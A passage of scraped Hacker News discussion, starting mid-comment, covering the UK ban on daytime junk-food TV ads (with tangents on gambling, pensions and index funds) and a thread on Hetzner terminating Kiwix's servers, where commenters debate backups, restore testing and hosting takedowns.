as a \"financial spread betting\" service. At the time, you could buy/sell futures and options with them but it was presented in a way that emphasized that you were \"spread betting\" - but the mechanics were the exact same and expiries all lined up with the obvious counterparts in the liquid futures space. So because you were NOT investing but gambling, \"winnings\" were tax free. I just googled and they're still going - presumably still offering the same betting \"service\". It's funny to see the efforts that scam and pure gambling services go to to try and present themselves as staid and serious \"investment\" business while IG Index offered access to well-regulated financial markets but kept reminding you that you were betting. reply ahoka 20 hours agorootparentNo gambling taxes? Must be a money laundering heaven. reply technion 17 hours agorootparentAs an Australian this is the first I've ever heard of paying taxes on gambling winnings. reply justincormack 20 hours agorootparentprevthere are taxes, but they are largely on the earnings of the gaming companies reply thanksgiving 19 hours agorootparentIt makes sense though if I think about it. In theory, all the money wagered is money that has already paid income tax at some point so why tax it again? reply funnybeam 10 hours agorootparentThat’s true of anything you pay money for reply throwaway2037 19 hours agorootparentprevBecause gambling is so terrible for your society! reply duiker101 21 hours agorootparentprevFor those unaware, this comment is referring to premium bonds in the UK[1]. It is a very interesting system, I agree! But there are quite a few parts of the system that make it way more fair than a lottery. Most obviously, it doesn't cost to enter. So the most you can \"lose\" is a missed interest income from putting the money in another source. After that, it's definitely the fact that the algorithm is designed to both pay a certain percentage of people and always have specific return. [1] You are also limited to how much you can enter to 50k. With all that in mind, at the end of the day it feels like many small wins over time, with the super random chance of occasionally having a big-ish payout. It's definitely designed to feel like a lottery, but in reality is way more akin to normal savings than a lottery. [1] https://www.nsandi.com/products/premium-bonds reply teruakohatu 20 hours agorootparentIn New Zealand this scheme was called \"Bonus Bonds\" and was wound up on 26 February 2024. Interest was charged on \"wins\" just like any other income. Apparently the average return was a paltry 1.5%. reply julianz 17 hours agorootparentEveryone knew someone's uncle who swore blind that he made heaps on the bonus bonds and had all his money \"invested\" in there, but I received some around my 10th birthday and they never struck a single prize. In 40 years. reply penguin_booze 6 hours agorootparentprevTax man: Did you earn your daily bread by working your arse off? Gimme some of that money. Also tax man: Oh did you get that money by luck? Good for you, man. Also tax man: Did you get inherit money by having been born into a wealthy family? Gimme some of that money. Also tax man: Were you born into the royal family? Good for you, man. Pardon me, I mean, your highness. reply thom 22 hours agorootparentprevYou’re not risking any capital though, if you mean Premium Bonds. reply hgomersall 21 hours agorootparentIndeed, premium bonds are just a slightly more \"entertaining\" way of allocating interest. Just as arbitrary as the MPC, but potentially a much higher rate (probably not though). reply anotheracc88 21 hours agorootparentprevEven better, pay that money into a pension and buy a lottery ticket. reply hinkley 21 hours agorootparentPensions sort of already are a lottery. Can’t collect if you’re dead. Live to 95 and they help a lot. Though inflation will still getcha in the end. reply anotheracc88 21 hours agorootparentYes if you choose annuity but you can also buy those with regular cash so it's as relevant here as price of tea. Pensions are more tax efficient and offer a better option of investments (companies) than what is effectively fiat interest going into a lottery pool. If you have cash in premium bonds you might die young then pay inheritance tax. Better give your kids cash earlier to live off or invest to avoid this, and so they can over-stuff their pensions ;). Not many people think that far ahead (60 year horizon) reply hinkley 21 hours agorootparentSome young adults in my life have grandparents who just hit this point, and are trying to set up gifting money to the grandkids in the form of brokerage accounts. reply throwaway2037 19 hours agorootparentprevBy this reasoning, isn't buying equities also gambling? Hint: It is not. reply Nullabillity 18 hours agorootparentWhy not? reply petesergeant 21 hours agorootparentprev> Pensions sort of already are a lottery Annuities maybe, but those aren’t the only kind of pensions reply kgwgk 21 hours agorootparentThat seems the definition of pension. You may be thinking of something else. pension a regular income paid by a government or a financial organization to someone who no longer works, usually because of their age or health reply petesergeant 6 hours agorootparentThe first line of the Wikipedia article on pensions is more accurate than wherever you’ve pulled that from: > A pension (/ˈpɛnʃən/; from Latin pensiō 'payment') is a fund into which amounts are paid regularly during an individual's working career, and from which periodic payments are made to support the person's retirement from work. A pension is a financial instrument. There’s no need to purchase an annuity, which means a pension organised correctly can be passed on to your children or spouse, and there’s no lottery or gamble angle. reply kgwgk 5 hours agorootparent> wherever you’ve pulled that from A dictionary: https://dictionary.cambridge.org/dictionary/english/dictiona... The wikipedia definition is strange. A pension is not a fund. A pension fund is a fund! (There is also a wikipedia page for that!) Apart from that how is “regular income paid by to someone who no longer works“ different from “periodic payments made to support the person's retirement from work” anyway? reply petesergeant 1 hour agorootparentBecause you missed the original distinction, which is that an annuity — a product purchased using your pension savings where all the value is lost when you die — is not the same as other pensions, where for example you have stocks and shares paying dividends, in a pension wrapper, and those pass on to your estate when you die. The word pension is overloaded. A SIPP is a pension, the state pension is a pension, and people refer to their annuity as pensions too. > A pension is not a fund. A pension fund is a fund! The word fund is being used in two different ways here. A pension is a fund, but is not a Pension Fund. reply gwbas1c 20 hours agoparentprevLet's just ban all ads! reply thanksgiving 19 hours agorootparentA good start would be a ban on ads based on who is viewing the ad vs what the content surrounding the ad is... So, Casper mattress wants to have an ad spot in a podcast or a YouTube video in the video itself? That's ok. YouTube wants to include an ad about a mattress in a video about home renovation? Also ok. Stack overflow wants to show an ad for GitHub? Is ok to me. YouTube wants to show an ad about Casper mattress based on whether someone has clicked on an ad about mattresses before? Banned! This alone would be a great start. reply gwbas1c 5 hours agorootparentI was joking, but I think you make my point better. reply Nullabillity 17 hours agorootparentprevOr... just get rid of them all. reply dzonga 21 hours agoparentprevi was going to comment on this. gambling ads of all kinds, sky-bet, sky vegas casino + whatever in their hydra form. in depressed places like luton - you see how gambling has destroyed the little that remained. ban gambling companies from sponsoring sports teams, from being associated with sports teams etc. reply hermitcrab 20 hours agorootparentIt is very noticeable that the gambling shops are clustered around the poorest parts of every town. I grew up near a gambling shop. You would see the punters desparately trying to eek out every last puff on their roll-up cigarettes, while the gambling shop owner would drive up in his Rolls Royce. reply b800h 20 hours agoparentprevOr massive vaping ads on the side of school buses. reply surgical_fire 20 hours agoparentprevI wonder if a prohibition to have gambling ads on TV would affect the Premier League teams that have gambling sponsorships reply jonplackett 22 hours agoparentprevThe warnings for gambling ads are particularly infuriating. Like what would anyone think of a smoking warning of “when the fun stops, stop” reply optimalsolver 22 hours agoparentprev>Can we do gambling ads next? As long as we ban ads for stock trading platforms (i.e. gambling for the professional classes) at the same time. reply jsheard 22 hours agorootparentI don't disagree, but stock trading ads are in some ways already more strictly regulated than gambling ads here. Gambling ads are required to have a vague \"please gamble responsibly\" statement, but ads for CFD trading platforms are required to have a prominent warning stating the exact percentage of their accounts which lose money (often >75%). The gambling ads don't have to tell you the real odds of coming out ahead. e.g. https://www.youtube.com/watch?v=KM_zuudkSnY reply stego-tech 22 hours agorootparentprevI think a fair and reasonable advertisement policy is to ban all advertisements during \"children's programming hours\", or 0800 to 1600 when school is not in session. During \"Prime Time\" hours of 0500-0800 and 1600-2300, adverts should be limited to luxury goods (e.g., fashion), government PSAs, and non-addictive goods or services (NO drugs, NO tobacco, NO gambling, and NO stock trading, to name but a few). Between 2300 and 0400, allow \"free reign\" on subscription channels but still bar \"vice\" or addiction ads. We've got a century of data showing laissez-faire approaches to advertising results in maximum harm to a society, and ample recent data from the internet age showing how dark patterns in psychology are exploited by advertisers to drive outcomes. We have to do better, and the UK's step is at least an attempt to stem the harm. I can't fault entities from at least trying to do better. reply BehindBlueEyes 1 hour agorootparentAdd to your list to ban medical advertisement to the vice and addiction bar. Do you feel like your knee itches sometime? You may have BSitis, ask your doctor if our product is right for you... Replace all these with a generic, if you feel sick, go see a doctor, that's what they are for if needed. reply chgs 22 hours agorootparentprevDaytime tv is all about brainwashing wealthy retired people. Still not as bad as those weird country which advertise prescription medicine reply alexchamberlain 21 hours agorootparentprevI wonder what proportion of children are still watching mainstream TV? My son (4) mainly watches Disney+ and Netflix. reply fn-mote 19 hours agorootparentChoosing streaming services will be correlated to income. Netflix (medium $) and Disney+ (high $$). The less wealthy are watching YouTube with ads included. reply lmm 18 hours agorootparentprevChildren are the people least able to destroy their own lives through spending, so that feels pretty backwards. I think it's generally accepted that people who grow up around e.g. alcohol tend to have a healthier relationship with it than people who are suddenly exposed to it as an adult. reply BehindBlueEyes 1 hour agorootparentBut they are among the most impressionable and it is effective to target the parents via kids nagging them. reply hermitcrab 20 hours agorootparentprevThere is an important difference. With stocks, the punter wins on average. With gambling, the punter loses on average. You can still lose all your money on stocks, with a combination of bad choices and bad luck. But it is much easier to lose it on the horses. reply shric 20 hours agorootparentThe punter does not win on average with stocks due to fees and spread. reply hermitcrab 20 hours agorootparentIIRC average stock market returns have historically been around 7% per year. Index funds charge around 1% per year. My stock ISAs have gone up pretty much every year (after inflation and fees). reply shric 9 hours agorootparentI was very careful with my words. I said: > The punter does not win on average with stocks due to fees and spread. Literally 100% of my investing is the stock market. I have so much faith in the stock market that I rent because I don't want to waste the opportunity cost on equity in property. A punter is informal slang for a person who gambles. I buy and hold a diversified portfolio of index funds over decades. I am very much not a punter. reply hermitcrab 9 hours agorootparentIt seems there is more than one definition of 'punter'. I meant it as 'customer/client'. But other sources define it as 'a person who gambles, places a bet, or makes a risky investment'. reply shric 8 hours agorootparentI'm only familiar with the latter definition. My mistake I guess. reply hermitcrab 8 hours agorootparent>My mistake I guess. Not really. There just seems to be more than one meaning, and we were each aware of different ones. The meaning might vary by country (I am in the UK). reply shric 6 hours agorootparentIt was a mistake because I got downvoted by issuing a correct statement (if punter is interpreted as a gambler). I am from the UK but moved to Australia about 35 years ago reply hermitcrab 4 hours agorootparent>It was a mistake because I got downvoted by issuing a correct statement (if punter is interpreted as a gambler). I wouldn't lose any sleep over it. https://xkcd.com/386/ ;o) reply lmm 18 hours agorootparentprev> Index funds charge around 1% per year. You're getting ripped off, you should be paying a small fraction of that. reply hermitcrab 8 hours agorootparentVanguard UK charge 0.06% to 0.6% per year on their index funds: https://www.vanguardinvestor.co.uk/what-we-offer/all-product... Plus a 0.15% account fee: https://www.vanguardinvestor.co.uk/what-we-offer/fees-explai... Most others charge more. reply rfrey 18 hours agorootparentprevPutting your money into an index fund is the exact opposite of what is being advertised, e.g. trading platforms optimized for day trading, complete with blinkenlighten and \"learn to trade\" mini courses teaching technical indicators and other voodoo nonsense. reply hermitcrab 8 hours agorootparentThere is a reason they spend loads of money on ads trying to get you into day trading. ;0) reply eviks 10 hours agorootparentprev> Index funds That's not what the ads for the stock trading platforms want you to do reply quickthrowman 17 hours agorootparentprev1% is quite extreme, the S&P 500 fund I use (FXAIX) charges .015% per year which is almost 70 times less expensive than 1%. reply shric 9 hours agorootparentIndeed, I am mostly in ASX:IVV (another S&P 500 ETF) and it charges 0.04% per year. reply iamacyborg 21 hours agorootparentprevWait until you hear about how CFD trading is legal in large parts of the world. reply throwaway2037 19 hours agorootparentIs the payout on a CFD the same as a future or forward? reply datavirtue 20 hours agorootparentprevIrrelevant. Stocks are a share of a company. The have book value and intrinsic value. Freedom to buy and sell is essential. Of course, crypto speculation is something different altogether. Maybe you were thinking about all the poor schleps buying Bitcoin for $100k? Even then, your chances of winning are around 50/50 and no one is forcing you to cash out. reply benatkin 18 hours agoparentprevSarcasm I hope... reply andrepd 21 hours agoparentprevI'm not in the UK, but yeah it's nothing short of fucking disgusting how plastered TV is with these incessant gambling ads. \"Gamble on slots on your phone while you're in the metro, the hairdresser, the dentist!\" they shout, at kids and adults alike, 2 times every minute on every commercial break. Disgusting. reply cynicalsecurity 22 hours agoparentprevThe business is probably owned by some rich and influential chap who eagerly shares with the right people in the parliament. reply paulpauper 21 hours agoprevfuture headline: A UK man was found dead in his flat after his TV broke. apparently he had starved to death after not being reminded of the existence of food by the ads. reply blackeyeblitzar 20 hours agoprevWhat about alcohol? Or other carb heavy or sugar heavy products? Why these? reply seabass-labrax 20 hours agoparentAs referenced by beejiu elsewhere on this thread[1], it applies to all foods products based on their nutritional content; there are no exemptions. Alcohol, however, does appear not to be covered by these new rules, but there are existing restrictions about advertising alcohol - [2] is one document on the topic, although I can't immediately tell if it's out of date. [1]: https://news.ycombinator.com/item?id=42360734 [2]: https://www.asa.org.uk/static/uploaded/d3683dc1-189e-413c-86... reply rsynnott 5 hours agoparentprevAdvertising alcohol to children is, of course, already illegal. reply quotemstr 20 hours agoprevWhat's TV? Some kind of primitive multicast YouTube? Anything TV related is irrelevant nowadays reply Eumenes 22 hours agoprevthis is exactly the type of policy you'd expect from a governing body that is completely out of touch with the working class. I can imagine the cambridge, UCL, and oxford graduates patting eachother on the back after the meeting, congratulating themselves on solving childhood obesity. reply userbinator 21 hours agoparentIt's what you'd expect of a country that's rapidly diving into Orwellian dystopia. reply hermitcrab 20 hours agorootparentDo you actually live in the UK or is this based on Musk tweets? reply Argonaut998 7 hours agorootparentNTA but I went to London for new years two years ago and it was worse than Musk’s tweets. “See it. Say it. Sort it” Ugh reply hermitcrab 6 hours agorootparentI live in the UK. It is far from perfect and the laws restricting the right to peaceful protest (enacted by the last government) had a very unwelcome authoritarian edge. But I don't see it \"rapidly diving into Orwellian dystopia\". Also London, is very different to the rest of the UK, in many ways. >“See it. Say it. Sort it” You know that the UK has a long history of terrorists placing bombs on public transport? reply pixxel 1 hour agorootparent> I live in the UK Do you live in all of the UK? reply Woeps 9 hours agorootparentprevUhm... the country we're talking about is the UK. Not some US state... reply pessimizer 20 hours agoprevWhat a useless, idle government. This is just pretending to work. Next, they'll raise the price of alcohol 10%, and make the penalties for \"knife crime\" 10% longer. Western governments have ceased to function for anything other than graft. There's a good paper (more than one, actually) on this that I wish I could recall offhand; but outside of graft, Western governments can only manage to govern (and not particularly well) during sudden emergencies, like natural disasters. Other than that, they're running worthless lifestyle campaigns to justify their continued existence to a faddish public, like this. The reduction of sales for cereals, muffins, and burgers will be non-existent. British children will remain fat. We will remain in thrall to a useless politics of trendy middle-class aesthetics, cheered on by celebrities. reply JSDevOps 20 hours agoprevThis will make zero difference these days. reply jsyang00 22 hours agoprevYes, it's the ads. After all, we know how economical and fast it is for people to access healthy meals. I look forward to the speedy eradication of all obesity problems reply anotheracc88 21 hours agoparentThe perfect. Enemy of the good. reply emrah 18 hours agoprev [–] So UK doesn't have freedom of speech any more? If the products are bad for people/kids/etc, why not ban the products instead of just the ads? reply Retric 18 hours agoparentUK never had freedom of speech the way we think of it in the US. https://en.wikipedia.org/wiki/Censorship_in_the_United_Kingd... I highlighted the explicit loophole here: “Article 10 – Freedom of expression Everyone has the right to freedom of expression. This right shall include freedom to hold opinions and to receive and impart information and ideas without interference by public authority and regardless of frontiers. This article shall not prevent States from requiring the licensing of broadcasting, television or cinema enterprises. The exercise of these freedoms, since it carries with it duties and responsibilities, may be subject to such formalities, conditions, restrictions or penalties as are prescribed by law and are necessary in a democratic society, in the interests of national security, territorial integrity or public safety, for the prevention of disorder or crime, for the protection of health or morals, for the protection of the reputation or rights of others, for preventing the disclosure of information received in confidence, or for maintaining the authority and impartiality of the judiciary.” reply rfrey 18 hours agoparentprev [–] Is it legal in the US to directly market cigarettes to children? Why not? reply Retric 18 hours agorootparent [–] An interesting wrinkle in the cigarettes example is it’s illegal sell them to kids. So advertising to kids is actively trying to conduct an illegal transaction. reply NicuCalcea 18 hours agorootparent [–] As far as I know, the US bans all tobacco advertising on TV. And obviously adults can still smoke. reply robertlagrant 1 hour agorootparentAll these laws make me want to step outside and take a long, smooth drag on a Marlboro Light. reply Retric 17 hours agorootparentprev [–] Radio and TV has long had more limited free speech protections because it’s a shared and thus finite resource. Thus the fines for curse words, nudity, etc. Banning in magazines targeting kids is a separate question. reply GuidelinesFAQListsAPISecurityLegalApply to YCContact Search:",
    "originSummary": [
      "The UK government is implementing a ban on daytime TV advertisements for sugary and \"less healthy\" foods, such as cereals, muffins, and burgers, to address child obesity.",
      "Starting next October, these ads will only be allowed to air after 9:00 pm, with the goal of preventing 20,000 cases of childhood obesity each year.",
      "Health Secretary Wes Streeting highlighted the importance of stopping the targeting of children with junk food advertisements."
    ],
    "commentSummary": [
      "The UK has implemented a ban on daytime TV advertisements for junk food, including cereals, muffins, and burgers, as a measure to combat childhood obesity.",
      "Critics argue that the ban is insufficient, as children are more influenced by online ads on platforms like YouTube and TikTok, which are not included in the ban.",
      "The debate persists on whether the government should enforce existing laws and regulate online ads targeting children or if parents should take more responsibility in protecting children from harmful advertising."
    ],
    "points": 273,
    "commentCount": 303,
    "retryCount": 0,
    "time": 1733687515
  },
  {
    "id": 42365295,
    "title": "Hetzner has decided to cancel our account and terminate all servers.",
    "originLink": "https://mastodon.social/@kiwix/113622081750449356",
    "originBody": "Create accountLogin Recent searches No recent searches Search options Only available when logged in. mastodon.social is one of the many independent Mastodon servers you can use to participate in the fediverse. Administered by: Server stats: mastodon.social: About · Status · Profiles directory · Privacy policy Mastodon: About · Get the app · Keyboard shortcuts · View source code · v4.4.0-nightly.2024-12-09 ExploreLive feeds Mastodon is the best way to keep up with what's happening. Follow anyone across the fediverse and see it all in chronological order. No algorithms, ads, or clickbait in sight. Create accountLogin About",
    "commentLink": "https://news.ycombinator.com/item?id=42365295",
    "commentBody": "\"Hetzner has decided to cancel our account and terminate all servers.\" (mastodon.social)216 points by unbelauscht 7 hours agohidepastfavorite127 comments KingOfCoders 6 hours agoWhenever I ask a CTO if they have a backup (or plan-B) they say we're on AWS, we backup there and they will never go down as a company. And then I ask them what they do when their account gets shut (e.g. because they are selling something bad on Amazon and have the same phone number as the company account?) Or the instance some years ago where GCP closed because someone had wrongly classified image on their drive? You should have all you backups in a different location and terraform tested with a different cloud provider, otherwise you're risking the company. [Edit] Where I come from: That doesn't say anything about Hetzner, I have been with them for 20+ years, they have stopped individual servers in that time frame, but haven't cancelled my whole account. reply endgame 6 hours agoparenthttps://cloud.google.com/blog/products/infrastructure/detail... Google Cloud accidentally wiped an Australian super[annuation] (pension) fund's entire cloud deployment earlier this year. I think that if you really want durable backups, they have to be reducible to object storage and put in someone else's cloud. reply diggan 6 hours agoparentprevAnother great question is \"When did you last try to restore from a backup?\" which usually is answered with \"It's the built-in tooling, why would we assume it's broken?\" or similar. Then fast-forward some months/years, and they try to restore from backups only to realize the backups never actually backed up what they cared about. reply KingOfCoders 5 hours agorootparentAgreed, if you haven't tested your backups recently (daily, automatic best), you don't have backups. Several of my clients (CTO Coaching) had problems in the past because they restored backups and where finding they were not complete (for various reasons). reply w8whut 3 hours agorootparentdaily test restore is infeasible for anything but toy projects. You should periodically test your restore procedures, but its incredibly costly and time consuming for sizeable platforms. Its just not that easy to restore a 10+TB backup for example, and thats a _tiny_ backup size for a b2c product. they can easily go into the hundreds of TB, depending on your platform. and i might add: i vividly remember gitlabs article how they have had automated backups and test restores for years, but when they actually needed them... it turned out some data wasn't part of it after all. just because youre testing your restore procedure doesnt mean you've actually accomplished anything. reply amyames 4 hours agorootparentprevaws-cli will sync your s3 buckets to a local system. I’m doing that to linux, and then the Linux box is furthermore backed up with nakivo. Not my favorite but the price was okay and I can run the whole director on Linux, unlike all their other competitors. [veeam’s next major release 13 or 14 should do this in the next year or so too.] While nakivo backs up s3 buckets, NFS shares, and local file servers… to your point, I don’t trust it (or any other backup software I can’t extract and unpack the resulting backup by hand) as far as I can throw it. So I rsync or mirror it to a local Linux box with aws-cli and then back THAT up. I think you can do all this with windows stuff too but I don’t know it that well Additionally you can take servers that are linux vps’es and do the reverse: mirror THEIR content to an s3 bucket. You can also run minio open source/free on your fileserver and set up s3 to s3 sync. Cloudflare for example will ingest and replicate your minio server automatically and you can firewall it all off to their address ranges. It’s not free but it actually prices out favorably compared to veeam and nakivo if that’s all you need backed up. reply hypeatei 6 hours agoparentprevI agree about data backups but replicating your setup in another cloud provider is: 1) Expensive 2) Not straightforward, e.g. is there a 1:1 setup in another cloud for your system? 3) Likely to go untested and be useless when you need it most reply benterix 5 hours agorootparentFully agree, that's why you need to think well first and come up with a compromise that you are willing to accept. Periodic testing of your DR procedures is non-negotiable but fortunately it's usually much simpler for smaller startups than for larger orgs. reply crote 4 hours agorootparentprevThe best part of cloud providers is that short-term VMs are relatively cheap to deploy. You don't need a full active-active failover setup, you just need to design your infrastructure in a cloud-agnostic way and test the deployment scripts a few times a year. The most expensive part is going to be maintaining an up-to-date offsite data backup. Running a few VMs for a handful of hours is basically free. reply KingOfCoders 5 hours agorootparentprevI do think (1.) depends on your company size, and business model. For most, it's cheap, e.g. https://rsync.net/pricing.html That said I was once a CTO for a company with 10 photo studios and we had a large amount of new (raw, DSLR) photos per minute, so cost was an issue and also upload speed for offsite backups. reply aurareturn 7 hours agoprevHang on, Hetzner literally deleted all their data without warning? That’s actually insane and business killing. Both for Hetzner’s reputation and potentially for their customer. reply SamWhited 6 hours agoparentThis happens literally all the time with Hetzner, I can't tell you how many times I've heard some variation of this story (or seen it here on HN), but they're cheap, and most people aren't going to find the people complaining online about it even if they do actually try to find out more about the company, so I'm afraid it hasn't hurt them much. reply danjac 6 hours agorootparentThey are great for throwaway hobbyist side projects where you don't want to worry about AWS billing horror stories or more expensive offerings like Digital Ocean or Linode. I would not recommend them for a serious, money-on-the-table business. reply benterix 5 hours agorootparentI only use them for money-making projetcs. Based on my own experience and what I read online, you need to be careful with: * crypto mining (I used it when it wasn't causing much trouble but I noticed my nodes were constantly attacked at a ratio I newer saw for other servers); IIRC Hetzner's current ToS forbid crypto mining * things in legally grey area which might be legal in some places but not so in others, especially in the EU * protect your servers well; if you become a victim of an attack and your servers will start attacking other, Hetzner will isolate them and notify you so that you can solve the problem Other than that, the only problems I had in the last 15 or so years are failing bare-metal components that they promptly replaced, that's all. reply sam_lowry_ 5 hours agorootparentprevI would absolutely use Hetzner for a real money-on-the-table business. You just have to know what you are up to and do your cost-benefit analysis. I actually moved a business of ~100 FTEs from AWS to Hetzner once. Aside from the migration cost, the price was roughly 25% of AWS. At the end, the biggest gain was not monetary, but human. For years, that business could retain skilled engineers who had the opportunity to work close to bare metal, caring about the nitty-gritty technical details of backups, failover and high availability. And they did not even cost much. That they had so much leeway in designing the system instead of \"relying on the cloud\" was a major retainer. I left many years ago, the business switched frameworks since then but they stayed on Hetzner. P.S. Yes, that was before Hetzner Cloud became a thing ) reply Cumpiler69 6 hours agorootparentprev>but they're cheap Maybe they're cheap for a reason. reply ffsm8 43 minutes agorootparentThey are cheap for a reason, and not the one you're implying. The fact that you seem to not know why they're cheap shows that you're completely uniformed about their service. reply SamWhited 6 hours agorootparentprevIndeed; no one ever seems to consider that before defaulting to them though :( reply ratg13 5 hours agorootparentI didn't default to them, but did start a new project on their infrastructure. They deleted all of my data a month in due to not beleiving my name was real, and without even bothering to contact me to verify anything. They deleted my backups as well because I was dumb enough to keep them under the same account. I learned a valuable lesson the hard way and have improved my methods as a result, but sad that it cost me an entire month's work due to carelessness and recklessness on their part. Sure, it's \"cheap for a reason\", but let's not pretend like this type of expectation is advertised, especially as many on HN tout them as a drop-in replacement for competitors. reply SamWhited 3 hours agorootparentI had actually forgotten about this, I had a friend who had the exact same thing happen (dropped because \"you have to use real names\" or whatever, but they did use their real name, and it wasn't even anything suspicious or weird [not that that should matter], they just have a vaguely common for Eastern Europe sounding name :S) reply adriand 6 hours agoparentprev> Hang on, Hetzner literally deleted all their data without warning? That’s what the post said. But of course we have no idea if it’s true or not. No evidence was provided, and we are only hearing one side of the story. reply nevi-me 6 hours agoparentprevI'm going to review my backup strategy these holidays, and look at how much downtime my services would incur if Hetzner shuts me down. The reality that they have this power, and that they'd delete data irretrievably, scares me. Last year I had a misconfigured port on a Docker service, and someone was able to exploit it and run a port scanner. It was during a period that I was away from home, so if I hadn't seen their service abuse emails in time, I could have returned home after a few days to find all my data wiped out (or uptime monitors complaining). reply 71bw 6 hours agoparentprev>Both for Hetzner’s reputation For what now? reply raverbashing 6 hours agoparentprevHonestly as much as we like to hammer on EU (lack of) companies, one potential improvement point is customer service German companies are awful at customer service. Even within the EU reply Cumpiler69 6 hours agorootparent>German companies are awful at customer service. True also from my experience. I've noted several potential reasons why that is from my time in Germany. Government provided customer protection laws are quite lax and disputes tricky to win and don't represent a big enough deterrent for the scammers when they're just a slap on the wrist and therefore part of the cost of doing business. Sure, you can get sued and you loose once, but if 80 of the 100 customers you scammed don't sue you or don't win, then you're still at a net positive and therefore it's profitable to keep doing that. Also that Germany doesn't have common law, so lawsuits aren't arbitrated based on precedent, so customers who got screwed need to sue and win individually for the same issue which is favorable for the companies doing the screwing as without the precedent of common law that minimizes their risk of loosing by slam dunk every time. Also, some German judges art just tech illiterate boomers who will throw out a case they don't even understand unless you're Axel Springer. (some) Rental agreements, internet, telco and gym memberships are my favorite infamous examples. They're almost universally regarded as anti-consumer, with tonnes of sketchy clauses, but German lawmakers do nothing to improve that for the consumer. Secondly, Germans aren't used to being very demanding and lighting a brand on fire on social media the way Americans/Anglophones do on Twitter when they don't like something, partly because of cultural reasons where making a fuss in public is discouraged/shamed, partly because of legal reasons where a company can sue your or at least send you scary legal letters for libel if you damage their brand online like that in Germany. Or at lest, the company can simply demand the social media platform take down the offending posts, and by German law they have to comply which the likes of Google/Meta will comply automatically without any arbitration. Also, culturally, the conservative Germans seem to have have gaslit themselves into believing everything \"Made in Germany\" is perfect without fault, while everything made abroad is of poor quality or at least worthy of scrutiny, so they just default to using German products without looking across the fence to check out the foreign competition. This way of thinking is more typical of manufactured goods but not sure how much it applies to SW products and services. Couple these with the difficulty of starting and scaling a business in Germany as a small entrepreneur and with the legal and bureaucratic hoops designed to keep foreign competitors out, mean that German companies operating in Germany who became established players, have litte incentive to improve beyond the bare minimum, so they can keep providing poor quality services while still staying in business. It's classic of an economy of well connected dinosaurs sitting on old money. reply snehk 5 hours agorootparent> [...] so customers who got screwed need to sue and win individually for the same issue which is favorable for the companies doing the screwing as without the precedent of common law This is factually false. > (some) Rental agreements, internet, telco and gym memberships are my favorite infamous examples. They're almost universally regarded as anti-consumer, with tonnes of sketchy clauses, but German lawmakers do nothing to improve that for the consumer. Any examples here? The fact that contracts like these, if you forgot to cancel them, can only renew for one month is better than anything I've seen anywhere else. Also that you must be able to cancel anything online with the click of a button if the contract was made online. Add that to the fact that any clause is worthless if it includes something a reasonable person wouldn't expect. I don't know many countries that actually enforce this - Germany does all the time. reply Cumpiler69 5 hours agorootparent>Add that to the fact that any clause is worthless if it includes something a reasonable person wouldn't expect. The problem is you always need to sue to get justice for that which means paying for lawyers and consuming time and money plus stress. reply raverbashing 5 hours agorootparentprev> The fact that contracts like these, if you forgot to cancel them, can only renew for one month is better than anything I've seen anywhere else. Do you have a source for this? (maybe it's a new thing) Because the subject of cancelling contracts is even a meme in the German (expat) community (of course for your standard German you need to be able to plan your life years ahead) reply fabian2k 5 hours agorootparentprevThere is a huge amount of protection for renters, a lot of things are simply illegal to put into the rental agreement and are automatically void. I really have no idea what you're talking about here. reply Cumpiler69 5 hours agorootparent>and are automatically void And yet they're still put ion the rental agreement because the landlords know they can get away with it s it's a seller's market. >I really have no idea what you're talking about here. Google or look on reddit posts of foreigners getting screwed in Germany. reply bryanrasmussen 6 hours agorootparentprev>German companies are awful at customer service. Even within the EU one would have to reconsider a century of stereotypes if they weren't. reply sznio 6 hours agoparentprevOnly reputation Hetzner has is \"cheap\". reply diggan 6 hours agoprevMost of the times you hear people complaining about Hetzner shutting down someone's servers, it's because they were hosting content going against their ToC or similar. But this seems to be about Kiwix (which in short is \"offline Wikipedia\" in various ways) and doesn't seem to be about questionable content in any way. Eventually I guess we'll get Hetzner's perspective on this, as they tend to start writing publicly about issues once the other side starts writing publicly about it as well. Personally I've been a happy user of Hetzner for many years, with no issues that weren't my own doing. But reading about people having their servers deleted in the middle of the night on a Sunday (Berlin time) and all data wiped immediately, with no recurse, does sound a bit aggressive. Luckily it seems like both me and Kiwix has mirrors for the data we care about. reply SamWhited 6 hours agoparent\"hosting content going against their ToC or similar\" Or hosting content that Hetzner misclassified as against their ToC. Or that they decided was because of a string in a random file name. Or, in one Mastodon instances case recently, because Hetzner saw that users could upload their own images and decided that was risky (nevermind that this is common and they have moderation and a strategy for if someone tries to host anything illegal, but that one employee reviewing it was twitchy that day and there is no recourse), etc. reply JohnBooty 6 hours agorootparentOr, in one Mastodon instances case recently, because Hetzner saw that users could upload their own images Wait, what? Yikes. I'm planning a project like that. Do you have a link to more information? reply SuperShibe 6 hours agorootparenthttps://woem.men/notes/9r86xd69cu89052m Also shoutout to Cloudflare for showing off what a diverse company they are in this one /s reply Redoubts 5 hours agorootparenthttps://woem.men/notes/9r5bwnci8x2204it “Actually, they’re 1000 years old” reply gurchik 1 hour agorootparentCareful, sharing that link is illegal in some jurisdictions reply SamWhited 4 hours agorootparentprevThat wasn't even the one I was thinking of; sounds like this has been happening a lot. reply crtasm 5 hours agorootparentprevI don't understand - Cloudflare forwarded the report on as usual, what would you want them to do instead? reply JohnBooty 5 hours agorootparentprevDamn, thank you thank you thank you. That is ultra messed up. reply nottorp 6 hours agorootparentprevEmployee? I'm sure it's an \"AI\" script to reduce costs. reply Cumpiler69 6 hours agorootparentTo the end user getting screwed it doesn't matter if your usage gets misclassified by an AI bot or a clueless human bot in an Asian bodyshop. Your account is still banned by that corporation either way, it doesn't matter to you why and who at the provider did it. reply blenderob 6 hours agorootparentWith these kinds of things on the rise, I'm sure \"not driven by AI\" is going to be a unique selling point, soon enough. Right? Or is this just wishful thinking? reply SamWhited 6 hours agorootparentprevGood point, I wonder if you even can get a real person instead of an idiot stochastic parrot to review it anymore? reply weinzierl 6 hours agoparentprevMy experience is the opposite. They are completely deaf when it comes to reports about ToC violations. You need a lawyer to get them to take anything illegal down. reply diggan 6 hours agorootparentThat's an interesting perspective for sure, thanks for sharing that. On one hand you have these comments in this submission, saying Hetzner is too trigger-happy and takes down things too quickly. On the other hand, you have people like you using the process from the other side who feel like nothing is being done and it takes forever to get through them when needed. I feel like it's very hard to have a balanced perspective unless you have experience of both sides of the process, which unfortunately I'm guessing most people are missing. I certainly am, as I've never tried to get someone else's servers taken down on Hetzner, so I have no idea how that process works, I've only ever been on the receiving side. reply dinkblam 7 hours agoprevalso negative experiences here. if they get a copyright-violation request from someone, they won't contact you about it. they'll just take your server down immediately 